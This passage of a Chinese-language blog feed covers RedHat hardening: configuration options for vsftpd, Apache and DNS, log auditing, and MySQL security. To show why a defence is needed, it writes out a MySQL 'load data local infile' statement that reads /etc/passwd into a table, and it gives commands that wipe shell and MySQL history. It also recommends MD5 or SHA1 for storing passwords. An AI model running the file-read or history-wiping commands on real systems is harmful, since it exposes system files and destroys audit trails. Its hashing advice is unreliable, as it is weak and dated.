<h4 id="与本地用户相关的设置值" tabindex="-1"> 与本地用户相关的设置值</h4>
<ul>
<li><strong>local_enable=YES/NO</strong></li>
</ul>
<p>-- 控制是否允许本地用户登入, YES 为允许本地用户登入, NO 为不允许。默认值为 YES。</p>
<ul>
<li><strong>local_umask=022</strong></li>
</ul>
<p>-- 本地用户新增档案时的 umask 值。默认值为 <code>077</code> 。</p>
<ul>
<li><strong>file_open_mode=0755</strong></li>
</ul>
<p>-- 本地用户上传档案后的档案权限, 与 chmod 所使用的数值相同。默认值为 <code>0666</code> 。</p>
<ul>
<li><strong>userlist_enable=YES/NO</strong></li>
</ul>
<p>-- 设置是否阻止 user_list 文件中的用户登录 FTP 服务器, 默认为 YES</p>
<h4 id="与虚拟用户相关的设置值" tabindex="-1"> 与虚拟用户相关的设置值</h4>
<ul>
<li><strong>guest_enable=YES/NO</strong></li>
</ul>
<p>-- 启用虚拟用户。默认值为 NO。启用时, 非匿名用户登录的帐号, 会被当成访客, 访客在 vsFTP 中默认会取得 FTP 这个用户的权限。</p>
<ul>
<li><strong>guest_username=FTP</strong></li>
</ul>
<p>-- 在 <code>guest_enable=YES</code> 下才生效, 指定游客的身份而已。默认为 FTP。</p>
<ul>
<li><strong>user_config_dir=</strong></li>
</ul>
<p>-- 指定游客用户的配置文件存放的目录, 无默认值, 需自己定义。</p>
<h4 id="与匿名用户相关的设置值" tabindex="-1"> 与匿名用户相关的设置值</h4>
<ul>
<li><strong>anonymous_enable=YES/NO</strong></li>
</ul>
<p>-- 控制是否允许匿名用户登入, YES 为允许匿名登入, NO 为不允许。</p>
<ul>
<li><strong>anon_upload_enable=YES/NO</strong></li>
</ul>
<p>-- 如果设为 YES, 则允许匿名登入者有上传文件（非目录）的权限, 只有在 <code>write_enable=YES</code> 时, 此项才有效。当然, 匿名用户必须要有对上层目录的写入权。默认值为 NO。</p>
<ul>
<li><strong>anon_world_readable_only=YES/NO</strong></li>
</ul>
<p>-- 如果设为 YES, 则允许匿名登入者下载可阅读的档案（可以下载到本机阅读, 不能直接在 FTP 服务器中打开阅读）。默认值为 YES。</p>
<ul>
<li><strong>anon_mkdir_write_enable=YES/NO</strong></li>
</ul>
<p>-- 如果设为 YES, 则允许匿名登入者有新增目录的权限, 只有在 <code>write_enable=YES</code> 时, 此项才有效。当然, 匿名用户必须要有对上层目录的写入权。默认值为 NO。</p>
<ul>
<li><strong>anon_other_write_enable=YES/NO</strong></li>
</ul>
<p>-- 如果设为 YES, 则允许匿名登入者更多于上传或者建立目录之外的权限, 譬如删除或者重命名。（如果 <code>anon_upload_enable=NO</code> , 则匿名用户不能上传文件, 但可以删除或者重命名已经存在的文件；如果 <code>anon_mkdir_write_enable=NO</code> , 则匿名用户不能上传或者新建文件夹, 但可以删除或者重命名已经存在的文件夹。）默认值为 NO。</p>
<h4 id="与用户限制相关的设置值" tabindex="-1"> 与用户限制相关的设置值</h4>
<ul>
<li><strong>chroot_list_enable=YES/NO</strong></li>
</ul>
<p>-- 设置是否启用 <code>chroot_list_file</code> 配置项指定的用户列表文件。默认值为 NO。</p>
<ul>
<li><strong>chroot_list_file=/etc/vsftpd.chroot_list</strong></li>
</ul>
<p>-- 用于指定用户列表文件, 该文件用于控制哪些用户可以切换到用户家目录的上级目录。</p>
<ul>
<li><strong>chroot_local_user=YES/NO</strong></li>
</ul>
<p>-- 用于指定用户列表文件中的用户是否允许切换到上级目录。默认值为 NO。</p>
<h3 id="服务的启动与停止-2" tabindex="-1"> 服务的启动与停止</h3>
<div><p>提示</p>
<p>FTP 的服务名并不叫做 <code>vsftp</code> , 而是 <code>vsftpd</code> 。</p>
</div>
<div><pre><code><span>service</span> vsftpd status        <span># 状态</span>
<span>service</span> vsftpd start         <span># 启动</span>
<span>service</span> vsftpd stop          <span># 暂停</span>
<span>service</span> vsftpd restart       <span># 重启</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div></div></div><h4 id="设置开机自启-2" tabindex="-1"> 设置开机自启</h4>
<div><pre><code><span>chkconfig</span> --list <span>|</span> <span>grep</span> vsftpd   <span># 查看自启状态</span>
<span>chkconfig</span> --level <span>35</span> vsftpd on   <span># 设置开机自启</span>
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><h2 id="apache-服务" tabindex="-1"> APACHE 服务</h2>
<p>APACHE 是一款 WEB 服务器软件, 它可以运行在几乎所有广泛使用的计算机平台上, 由于其跨平台和安全性被广泛使用, 是最流行的 WEB 服务器端软件之一。</p>
<h3 id="使用到的端口号-3" tabindex="-1"> 使用到的端口号</h3>
<ul>
<li>超文本传输协议（默认为 <code>80</code> 端口）</li>
<li>更安全的超文本传输协议（默认为 <code>443</code> 端口）</li>
</ul>
<h3 id="所需软件-3" tabindex="-1"> 所需软件</h3>
<p>APACHE 服务需要较多的软件进行支持, RedHat 已经预装了此软件, 这里就不一一阐述了。</p>
<h3 id="主要的配置文件-1" tabindex="-1"> 主要的配置文件</h3>
<ul>
<li><strong>/etc/httpd/conf/httpd.conf</strong></li>
</ul>
<p>-- 最主要的配置文件, 里买内包含了 APACHE 服务器主配置文件. 包括服务器指令的目录设置。</p>
<h3 id="查看配置文件爱呢的帮助" tabindex="-1"> 查看配置文件爱呢的帮助</h3>
<div><pre><code><span>man</span> <span>5</span> httpd.conf
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="重要选项说明-3" tabindex="-1"> 重要选项说明</h3>
<ul>
<li><strong>Listen 80</strong></li>
</ul>
<p>-- 设置监听的端口号</p>
<ul>
<li><strong>DocumentRoot &quot;/var/www/html&quot;</strong></li>
</ul>
<p>-- 定义网站的根目录, 默认的目录在 <code>/var/www/html</code> , 修改此选项时, 要同时修改下面一个选项。</p>
<ul>
<li>&lt;<strong>Directory &quot;/var/www/html&quot;</strong>&gt;</li>
</ul>
<p>-- 定义网站的一个目录, 修改此选项时, 要同时修改上面一个选项。</p>
<ul>
<li><strong>Alias /icons/ &quot;/var/www/icons&quot;</strong></li>
</ul>
<p>-- 目录的别名设置, 就是浏览器访问 <code>http://[host]/icons</code> 时, 实际上访问的是 <code>/var/www/icons</code> 目录, 配置此选项时, 要同时配置下面的目录权限。</p>
<ul>
<li>
<p>&lt;<strong>Directory &quot;/var/www/icons&quot;</strong>&gt;</p>
</li>
<li>
<p><strong>Options Index FollowSymLinks</strong></p>
</li>
</ul>
<p>-- <code>Index</code> 设置是否开启目录浏览, 默认启用, 禁止在前面加一个 <code>-</code> -- <code>FollowSymLinks</code> 设置是否禁用符号连接追踪, 默认启用, 禁止在前面加一个 <code>-</code></p>
<ul>
<li><strong>Allow from all</strong></li>
</ul>
<p>-- 配置白名单, 默认允许所有的 IP 段访问。</p>
<ul>
<li><strong>ServerSignature On</strong></li>
</ul>
<p>-- 配置是否隐藏 APACHE 的版本信息, 默认是开启, 还可以设置为 <code>Off</code> 和 <code>EMail</code> 。其中 <code>Off</code> 是隐藏信息, <code>EMail</code> 是会显示管理员的 email 信息的。</p>
<ul>
<li><strong>NameVirtualHost *:443</strong></li>
</ul>
<p>-- 设置开放的端口, 一般在配置 <code>https</code> 时候修改它, 修改这个选项, 要同时修改下面一个选项。</p>
<ul>
<li>&lt;<strong>VirtualHost *:443</strong>&gt;</li>
</ul>
<p>-- 设置开放的端口。</p>
<h3 id="服务的启动与停止-3" tabindex="-1"> 服务的启动与停止</h3>
<div><p>提示</p>
<p>APACHE 的服务名并不叫做 <code>http</code> , 而是 <code>httpd</code> 。</p>
</div>
<div><pre><code><span>service</span> httpd status        <span># 状态</span>
<span>service</span> httpd start         <span># 启动</span>
<span>service</span> httpd stop          <span># 暂停</span>
<span>service</span> httpd restart       <span># 重启</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div></div></div><h4 id="设置开机自启-3" tabindex="-1"> 设置开机自启</h4>
<div><pre><code><span>chkconfig</span> --list <span>|</span> <span>grep</span> httpd   <span># 查看自启状态</span>
<span>chkconfig</span> --level <span>35</span> httpd on   <span># 设置开机自启</span>
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><h2 id="dns-服务" tabindex="-1"> DNS 服务</h2>
<div><p>提示</p>
<p>DNS（Domain Name Server, 域名服务器）是进行域名(domain name)和与之相对应的 IP 地址 (IP address) 转换的服务器。</p>
</div>
<h3 id="使用到的端口号-4" tabindex="-1"> 使用到的端口号</h3>
<ul>
<li>UDP 解析（默认为 <code>53</code> 端口）</li>
</ul>
<h3 id="所需软件-4" tabindex="-1"> 所需软件</h3>
<ul>
<li><strong>bind</strong></li>
</ul>
<p>-- DNS 主要的包, 包含 named 守护进程（用来回答查询结果的）, 还有一些重要命令: <code>nslookup</code> , <code>dig</code> 和 <code>host</code> , 等等。</p>
<ul>
<li><strong>caching-nameserver</strong></li>
</ul>
<p>-- 包含 DNS 的主配置文件模板, 区域配置文件模板等。</p>
<h3 id="主配置文件-2" tabindex="-1"> 主配置文件</h3>
<ul>
<li><strong>/etc/named-caching-nameserver.conf</strong></li>
</ul>
<p>-- DNS 主配置文件, 实际中需要把此文件复制成 <code>named.conf</code> , 方能使用</p>
<ul>
<li><strong>/etc/named-rfc1912.zones</strong></li>
</ul>
<p>-- DNS 区域配置文件, 实际中需要把此文件复制成 <code>named.zones</code> , 方能使用</p>
<ul>
<li><strong>/var/named/named.zero</strong></li>
</ul>
<p>-- DNS 正向解析文件, 实际中需要把此文件复制成 <code>named.zones</code> 中配置的文件名</p>
<ul>
<li><strong>/var/named/named.local</strong></li>
</ul>
<p>-- DNS 反向解析文件, 实际中需要把此文件复制成 <code>named.zones</code> 中配置的文件名</p>
<h3 id="查看主配置文件的帮助-3" tabindex="-1"> 查看主配置文件的帮助</h3>
<div><pre><code><span>man</span> <span>5</span> named-caching-nameserver.conf
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="重要选项说明-4" tabindex="-1"> 重要选项说明</h3>
<ul>
<li>**allow-query { any; }; **</li>
</ul>
<p>-- 表示所有人能查询这台服务器, 可以修改成 IP 地址或网段, 限制其查询</p>
<ul>
<li>**allow-recursion { any; }; **</li>
</ul>
<p>-- 只针对收到的递归查询请求, 对于非递归请求不关心, 可以修改成 IP 地址或网段, 限制其递归查询</p>
<ul>
<li>**allow-transfer { any; }; **</li>
</ul>
<p>-- 限制哪些主机或者网络可以传递信息至区域文件</p>
<h3 id="服务的启动与停止-4" tabindex="-1"> 服务的启动与停止</h3>
<div><p>提示</p>
<p>DNS 的服务名并不叫做 <code>name</code> , 而是 <code>named</code> 。</p>
</div>
<div><pre><code><span>service</span> named status        <span># 状态</span>
<span>service</span> named start         <span># 启动</span>
<span>service</span> named stop          <span># 暂停</span>
<span>service</span> named restart       <span># 重启</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div></div></div><h4 id="设置开机自启-4" tabindex="-1"> 设置开机自启</h4>
<div><pre><code><span>chkconfig</span> --list <span>|</span> <span>grep</span> named   <span># 查看自启状态</span>
<span>chkconfig</span> --level <span>35</span> named on   <span># 设置开机自启</span>
</code></pre><div aria-hidden="true"><div></div><div></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>RedHat 系统安全加固（三）系统日志审计</title>
      <link>https://vxhly.github.io/views/liunx/log-audit-function.html</link>
      <guid>https://vxhly.github.io/views/liunx/log-audit-function.html</guid>
      <source url="https://vxhly.github.io/rss.xml">RedHat 系统安全加固（三）系统日志审计</source>
      <description>前言
本系列笔记又是 Liunx 学习系列教程的一大步, 本系列学习笔记记录 RedHat 系统的安全加固。本篇笔记是记录系统日志审计的配置, 加强系统的防御能力。

</description>
      <category>liunx</category>
      <pubDate>Sun, 16 Oct 2016 13:39:09 GMT</pubDate>
      <content:encoded><![CDATA[<div><p>前言</p>
<p>本系列笔记又是 Liunx 学习系列教程的一大步, 本系列学习笔记记录 RedHat 系统的安全加固。本篇笔记是记录系统日志审计的配置, 加强系统的防御能力。</p>
</div>

<h2 id="syslog-登录事件记录" tabindex="-1"> syslog 登录事件记录</h2>
<p>查看参数 <code>authpriv</code> 值, <code>For Exmaple:</code></p>
<div><pre><code><span>more</span> /etc/syslog.conf <span>|</span> <span>grep</span> authpriv
</code></pre><div aria-hidden="true"><div></div></div></div><p>表名登录事件记录在 <code>/var/log/secure</code> 文件中, 使用以下命令检查非法记录</p>
<div><pre><code><span>more</span> /var/log/secure <span>|</span> <span>grep</span> refused
</code></pre><div aria-hidden="true"><div></div></div></div><p><img src="/assets/redhat-reinforce-16.png" alt="RedHat 安全加固"></p>
<h2 id="审计功能的进程" tabindex="-1"> 审计功能的进程</h2>
<p>启动审计进程, <code>For Exmaple:</code></p>
<div><pre><code><span>service</span> auditd start
<span>service</span> psacct start
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><p>启动 <code>psacct</code> 服务</p>
<div><pre><code><span>service</span> psacct start
<span>chkconfig</span> psacct on
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><h2 id="查看记录审计的日志" tabindex="-1"> 查看记录审计的日志</h2>
<ul>
<li><code>auditd</code> 审计进程日志记录在 <code>/var/log/audit/audit.log</code></li>
<li><code>psacct</code> 日志记录在 <code>/var/account/pacct</code></li>
</ul>
<div><p>注意</p>
<p><code>pacct</code> 日志是二进制文件, 使用以下命令进行查看</p>
</div>
<p><code>For Exmaple:</code></p>
<div><pre><code>lastcomm -f /var/account/pacct
</code></pre><div aria-hidden="true"><div></div></div></div><h2 id="登录日志查看" tabindex="-1"> 登录日志查看</h2>
<p><code>lastlog</code> 查看用户最后一次登录时间, <code>For Exmaple:</code></p>
<div><pre><code>lastlog
</code></pre><div aria-hidden="true"><div></div></div></div><p><img src="/assets/redhat-reinforce-17.png" alt="RedHat 安全加固"></p>
]]></content:encoded>
      <enclosure url="https://vxhly.github.io/assets/redhat-reinforce-16.png" type="image/png"/>
    </item>
    <item>
      <title>MySQL 数据库安全加固</title>
      <link>https://vxhly.github.io/views/liunx/mysql-database-user-policy.html</link>
      <guid>https://vxhly.github.io/views/liunx/mysql-database-user-policy.html</guid>
      <source url="https://vxhly.github.io/rss.xml">MySQL 数据库安全加固</source>
      <description>前言
数据库作为数据管理的平台, 它的安全性首先由系统内部和网络安全两部分来决定的。对于系统管理员来说, 首先要保证系统本身的安全, 在安装 MySQL 数据时, 需要对基础环境进行较好的配置。本篇笔记将记录在 RedHat Liunx 系统下 MySQL 数据库的安全加固方法。

</description>
      <category>liunx</category>
      <pubDate>Sun, 30 Oct 2016 16:02:43 GMT</pubDate>
      <content:encoded><![CDATA[<div><p>前言</p>
<p>数据库作为数据管理的平台, 它的安全性首先由系统内部和网络安全两部分来决定的。对于系统管理员来说, 首先要保证系统本身的安全, 在安装 MySQL 数据时, 需要对基础环境进行较好的配置。本篇笔记将记录在 RedHat Liunx 系统下 MySQL 数据库的安全加固方法。</p>
</div>

<h2 id="修改-root-用户口令" tabindex="-1"> 修改 root 用户口令</h2>
<p>缺省安装的 MySQL 的 root 用户是空密码的, 为了安全起见, 必须修改为强密码, 所谓的强密码, 至少 8 位, 由字母、数字和符号组成的不规律密码。使用 MySQL 自带的命令 <code>mysqladmin</code> 修改 root 密码, 同时也可以登陆数据库, 修改数据库 mysql 下的 user 表的字段内容</p>
<h3 id="使用-mysqladmin-命令" tabindex="-1"> 使用 mysqladmin 命令</h3>
<p>修改密码, <code>For Example:</code></p>
<div><pre><code>mysqladmin -u root password <span>"upassword"</span>
</code></pre><div aria-hidden="true"><div></div></div></div><p><img src="/assets/mysql-reinforce-1.png" alt="MySQL 数据库加固"></p>
<h3 id="使用-sql-语句修改" tabindex="-1"> 使用 SQL 语句修改</h3>
<p><code>Connection Example:</code></p>
<div><pre><code>mysql -h <span>127.0</span>.0.1 -u root -p
</code></pre><div aria-hidden="true"><div></div></div></div><p>输入之前设置的密码 <code>upassword</code> , 连接数据库</p>
<p>修改密码, <code>For Example:</code></p>
<div><pre><code>mysql<span>></span> <span>use</span> mysql<span>;</span>        <span>-- 切换当前的数据库</span>
mysql<span>></span> <span>update</span> mysql<span>.</span><span>user</span> <span>set</span> password<span>=</span>password<span>(</span><span>'upassword'</span><span>)</span> <span>where</span> <span>user</span><span>=</span><span>'root'</span><span>;</span>
mysql<span>></span> flush <span>privileges</span><span>;</span> <span>-- 强制刷新内存授权表,否则用的还是内存缓存中的口令。</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div></div></div><p><img src="/assets/mysql-reinforce-2.png" alt="MySQL 数据库加固"></p>
<p>修改完成之后可以执行 SQL 语句查询, <code>For Example:</code></p>
<div><pre><code>mysql<span>></span> <span>select</span> <span>*</span> <span>from</span> mysql<span>.</span><span>user</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div></div></div><h2 id="删除默认数据库和数据库用户" tabindex="-1"> 删除默认数据库和数据库用户</h2>
<p>一般情况下, MySQL 数据库安装在本地, 并且也只需要本地的 php 脚本对 mysql 进行读取, 所以很多用户不需要, 尤其是默认安装的用户。MySQL 初始化后会自动生成空用户和 test 库, 进行安装的测试, 这会对数据库的安全构成威胁, 有必要全部删除, 最后的状态只保留单个 root 即可, 当然以后根据需要增加用户和数据库。</p>
<p>执行以下 SQL 语句, <code>For Example:</code></p>
<div><pre><code>mysql<span>></span> <span>show</span> <span>databases</span><span>;</span>   <span>-- 显示当前的所有数据库</span>
mysql<span>></span> <span>drop</span> <span>database</span> test<span>;</span><span>-- 删除数据库 test</span>
mysql<span>></span> <span>use</span> mysql<span>;</span>
mysql<span>></span> <span>delete</span> <span>from</span> db<span>;</span>   <span>-- 删除存放在数据库的表信息,因为还没有数据库信息</span>
mysql<span>></span> <span>delete</span> <span>from</span> mysql<span>.</span><span>user</span> <span>where</span> <span>not</span> <span>(</span><span>user</span><span>=</span><span>'root'</span><span>)</span><span>;</span>
mysql<span>></span> <span>delete</span> <span>from</span> mysql<span>.</span><span>user</span> <span>where</span> <span>user</span><span>=</span><span>'root'</span> <span>and</span> password<span>=</span><span>''</span><span>;</span>
mysql<span>></span> flush <span>privileges</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p><img src="/assets/mysql-reinforce-3.png" alt="MySQL 数据库加固"></p>
<br>
<p><img src="/assets/mysql-reinforce-4.png" alt="MySQL 数据库加固"></p>
<br>
<p><img src="/assets/mysql-reinforce-5.png" alt="MySQL 数据库加固"></p>
<h2 id="改变默认-mysql-管理员账号" tabindex="-1"> 改变默认 MySQL 管理员账号</h2>
<p>系统 MySQL 的管理员名称是 root, 而一般情况下, 数据库管理员都没进行修改, 这一定程度上对系统用户穷举的恶意行为提供了便利, 此时修改为复杂的用户名, 请不要在设定为 admin 或者 administraror 的形式, 因为它们也在易猜的用户字典中。</p>
<div><pre><code>mysql<span>></span> <span>update</span> mysql<span>.</span><span>user</span> <span>set</span> <span>user</span><span>=</span><span>"newroot"</span> <span>where</span> <span>user</span><span>=</span><span>"root"</span><span>;</span>
mysql<span>></span> flush <span>privileges</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><p><img src="/assets/mysql-reinforce-6.png" alt="MySQL 数据库加固"></p>
<h2 id="关于密码的管理" tabindex="-1"> 关于密码的管理</h2>
<p>密码是数据库安全管理的一个很重要因素, 不要将纯文本密码保存到数据库中。如果你的计算机有安全危险, 入侵者可以获得所有的密码并使用它们。相反, 应使用 <code>MD5()</code> 、 <code>SHA1()</code> 或单向哈希函数。也不要从词典中选择密码, 有专门的程序可以破解它们, 请选用至少八位, 由字母、数字和符号组成的强密码。在存取密码时, 使用 mysql 的内置函数 <code>password（）</code> 的 sql 语句, 对密码进行加密后存储。例如以下方式在 users 表中加入新用户。</p>
<div><pre><code>mysql<span>></span> <span>insert</span> <span>into</span> users <span>values</span> <span>(</span><span>1</span><span>,</span>password<span>(</span><span>1234</span><span>)</span><span>,</span><span>'test'</span><span>)</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div></div></div><h2 id="使用独立用户运行-mysql" tabindex="-1"> 使用独立用户运行 MySQL</h2>
<p>绝对不要作为使用 root 用户运行 <code>MySQL 服务器</code> 。这样做非常危险, 因为任何具有 FILE 权限的用户能够用 root 创建文件(例如: <code>~root/.bashrc</code> )。mysqld 拒绝使用 root 运行, 除非使用 <code>–user=root</code> 选项明显指定。应该用普通非特权用户运行 mysqld。</p>
<p>要想用其它 Unix 用户启动 mysqld, , 增加 user 选项指定 <code>/etc/my.cnf</code> 选项文件或服务器数据目录的 <code>my.cnf</code> 选项文件中的 <code>[mysqld]</code> 组的用户名。</p>
<h3 id="加固" tabindex="-1"> 加固</h3>
<p><code>/etc/my.cnf</code> 配置文件</p>
<div><pre><code><span>[</span>mysqld<span>]</span>
<span>user</span><span>=</span>mysql
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><p><img src="/assets/mysql-reinforce-7.png" alt="MySQL 数据库加固"></p>
<p>该命令使服务器用指定的用户来启动, 无论你手动启动或通过 <code>mysqld_safe</code> 或 <code>mysql.server</code> 启动, 都能确保使用 mysql 的身份。也可以在启动数据库是, 加上 <code>user</code> 参数。</p>
<div><pre><code>/usr/bin/mysqld_safe --user<span>=</span>mysql
</code></pre><div aria-hidden="true"><div></div></div></div><p>作为其它 linux 用户而不用 root 运行 mysqld, 你不需要更改 user 表中的 root 用户名, 因为 <code>MySQL 账户</code> 的用户名与 <code>linux 账户</code> 的用户名无关。确保 mysqld 运行时, 只使用对数据库目录具有读或写权限的 linux 用户来运行。</p>
<p><img src="/assets/mysql-reinforce-8.png" alt="MySQL 数据库加固"></p>
<h2 id="禁止远程连接数据库" tabindex="-1"> 禁止远程连接数据库</h2>
<p>在命令行 <code>netstat -ant</code> 下看到, 默认的 <code>3306</code> 端口是打开的, 此时打开了 <code>mysqld</code> 的网络监听, 允许用户远程通过帐号密码连接数本地据库, 默认情况是允许远程连接数据的。为了禁止该功能, 启动 <code>skip-networking</code> , 不监听 sql 的任何 <code>TCP/IP</code> 的连接, 切断远程访问的权利, 保证安全性。假如需要远程管理数据库, 可通过安装 <code>PhpMyadmin</code> 来实现。假如确实需要远程连接数据库, 至少修改默认的监听端口, 同时添加防火墙规则, 只允许可信任的网络的 <code>mysql</code> 监听端口的数据通过。</p>
<h3 id="加固-1" tabindex="-1"> 加固</h3>
<p>编辑 <code>/etc/my.cnf</code> , 加入如下语句</p>
<div><pre><code><span>[</span>mysqld<span>]</span>
skip-networking
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><p><img src="/assets/mysql-reinforce-9.png" alt="MySQL 数据库加固"></p>
<p>执行重启语句, <code>For Example:</code></p>
<div><pre><code><span>service</span> mysqld restart
</code></pre><div aria-hidden="true"><div></div></div></div><h2 id="限制连接用户的数量" tabindex="-1"> 限制连接用户的数量</h2>
<p>数据库的某用户多次远程连接, 会导致性能的下降和影响其他用户的操作, 有必要对其进行限制。可以通过限制单个账户允许的连接数量来实现, 设置 <code>my.cnf</code> 文件的 <code>mysqld</code> 中的 <code>max_user_connections</code> 变量来完成。 <code>GRANT</code> 语句也可以支持 资源控制选项来限制服务器对一个账户允许的使用范围。</p>
<p>编辑 <code>/etc/my.cnf</code> , 加入如下语句</p>
<div><pre><code><span>[</span>mysqld<span>]</span>
max_user_connections <span>2</span>
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><p><img src="/assets/mysql-reinforce-10.png" alt="MySQL 数据库加固"></p>
<h2 id="用户目录权限限制" tabindex="-1"> 用户目录权限限制</h2>
<p>默认的 MySQL 是安装在 <code>/usr/share/mysql</code> , 而对应的数据库文件在 <code>/var/lib/mysql</code> 目录下, 因此, 必须保证该目录不能让未经授权的用户访问后把数据库打包拷贝走了, 所以要限制对该目录的访问。确保 <code>mysqld</code> 运行时, 只使用对数据库目录具有读或写权限的 linux 用户来运行。</p>
<p>修改权限, <code>For Example:</code></p>
<div><pre><code><span>chown</span> -R root /usr/share/mysql
<span>chown</span> -R mysql:mysql /var/lib/mysql
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><p><img src="/assets/mysql-reinforce-11.png" alt="MySQL 数据库加固"></p>
<h2 id="命令历史记录保护" tabindex="-1"> 命令历史记录保护</h2>
<p>数据库相关的 shell 操作命令都会分别记录在 <code>.bash_history</code> , 如果这些文件不慎被读取, 会导致数据库密码和数据库结构等信息泄露, 而登陆数据库后的操作将记录在 <code>/etc/my.cnf</code> 文件配置的文件中, 如果使用 <code>update</code> 表信息来修改数据库用户密码的话, 也会被读取密码, 因此需要删除这两个文件, 同时在进行登陆或备份数据库等与密码相关操作时, 应该使用 <code>-p</code> 参数加入提示输入密码后, 隐式输入密码, 建议将以上文件置空。</p>
<h3 id="加固-2" tabindex="-1"> 加固</h3>
<p>配置文件 <code>/etc/my.cnf</code> 中配置数据库操作日志存放路径, <code>For Example:</code></p>
<div><pre><code><span>[</span>mysqld_safe<span>]</span>
<span>log</span><span>=~</span>/.mysql_history
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><p><img src="/assets/mysql-reinforce-12.png" alt="MySQL 数据库加固"></p>
<p>随意执行一些操作, <code>For Example:</code> <br></p>
<p><img src="/assets/mysql-reinforce-13.png" alt="MySQL 数据库加固"></p>
<p>查看 <code>~/.mysql_history</code> 文件, 可以看到数据库操作纪录（将会纪录所有成功或者失败的操作 SQL 语句）<br></p>
<p><img src="/assets/mysql-reinforce-14.png" alt="MySQL 数据库加固"></p>
<p>查看 <code>~/.bash_history</code> 文件, 可以看到有关于数据操作的 shell 命令<br></p>
<p><img src="/assets/mysql-reinforce-15.png" alt="MySQL 数据库加固"></p>
<p>删除操作命令, <code>For Example:</code></p>
<div><pre><code><span>rm</span> .bash_history .mysql_history
<span>ln</span> -s /dev/null .bash_history
<span>ln</span> -s /dev/null .mysql_history
</code></pre><div aria-hidden="true"><div></div><div></div><div></div></div></div><p><img src="/assets/mysql-reinforce-16.png" alt="MySQL 数据库加固"></p>
<h2 id="禁止-mysql-对本地文件存取" tabindex="-1"> 禁止 MySQL 对本地文件存取</h2>
<p>在 mysql 中, 提供对本地文件的读取, 使用的是 <code>load data local infile</code> 命令, 默认在 5.0 版本中, 该选项是默认打开的, 该操作令会利用 MySQL 把本地文件读到数据库中, 然后用户就可以非法获取敏感信息了, 假如你不需要读取本地文件, 请务必关闭。</p>
<h3 id="测试存取" tabindex="-1"> 测试存取</h3>
<p>测试: 首先在测试数据库下建立 <code>sqlfile.txt</code> 文件, 用逗号隔开各个字段<br></p>
<p><img src="/assets/mysql-reinforce-19.png" alt="MySQL 数据库加固"></p>
<p>在测试数据库, 先新建一张表, 建表的 SQL 语句如下, <code>For Example:</code></p>
<div><pre><code><span>create</span> <span>table</span> users <span>(</span>
  userid <span>int</span><span>(</span><span>11</span><span>)</span><span>,</span>
  username <span>varchar</span><span>(</span><span>255</span><span>)</span><span>,</span>
  password <span>int</span><span>(</span><span>11</span><span>)</span>
<span>)</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div></div></div><p><img src="/assets/mysql-reinforce-17.png" alt="MySQL 数据库加固"></p>
<p>执行导入语句, <code>For Example:</code></p>
<div><pre><code>mysql<span>></span> <span>load</span> <span>data</span> <span>local</span> <span>infile</span> <span>'sqlfile.txt'</span> <span>into</span> <span>table</span> test<span>.</span>users <span>fields</span> <span>terminated</span> <span>by</span> <span>','</span><span>;</span>
mysql<span>></span> <span>select</span> <span>*</span> <span>from</span> test<span>.</span>users<span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><p><img src="/assets/mysql-reinforce-18.png" alt="MySQL 数据库加固"></p>
<p>成功的将本地数据插入数据中, 此时应该禁止 MySQL 中用 <code>load data local infile</code> 命令。网络上流传的一些攻击方法中就有用它 <code>load data local infile</code> 的, 同时它也是很多新发现的 <code>SQL Injection</code> 攻击利用的手段！黑客还能通过使用 <code>load data local infile</code> 装载 <code>/etc/passwd</code> 进一个数据库表, 然后能用 <code>SELECT</code> 显示它, 这个操作对服务器的安全来说, 是致命的。可以在 <code>/etc/my.cnf</code> 中添加 <code>local-infile=0</code> , 或者加参数 <code>local-infile=0</code> 启动 <code>mysql</code> 。</p>
<h3 id="sql-攻击" tabindex="-1"> SQL 攻击</h3>
<p>黑客使用 <code>load data local infile</code> 获取 <code>/etc/passwd</code> 文件内容步骤<br></p>
<p><img src="/assets/mysql-reinforce-20.png" alt="MySQL 数据库加固"></p>
<p>接下来黑客只需执行 <code>select * from test.passwd</code> 就可以查询到数据了。</p>
<h4 id="加固-3" tabindex="-1"> 加固</h4>
<p>编辑 <code>/etc/my.cnf</code> 文件, 加入如下语句, <code>For Example:</code></p>
<div><pre><code><span>[</span>mysqld<span>]</span>
local-infile<span>=</span><span>0</span>
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><p><img src="/assets/mysql-reinforce-21.png" alt="MySQL 数据库加固"></p>
<p>或者直接执行命令, <code>For Example:</code></p>
<div><pre><code>mysql_safe --user<span>=</span>mysql --local-infile<span>=</span><span>0</span>
</code></pre><div aria-hidden="true"><div></div></div></div><p>再次执行 <code>load data local infile</code> 命令, 导入 <code>/etc/passwd</code> 内容, 发现命令出错</p>
<div><pre><code>mysql<span>></span> <span>load</span> <span>data</span> <span>local</span> <span>infile</span> <span>'/etc/passwd'</span> <span>into</span> <span>table</span> test<span>.</span>passwd <span>fields</span> <span>terminated</span> <span>by</span> <span>':'</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div></div></div><p><img src="/assets/mysql-reinforce-22.png" alt="MySQL 数据库加固"></p>
<h2 id="mysql-服务器权限控制" tabindex="-1"> MySQL 服务器权限控制</h2>
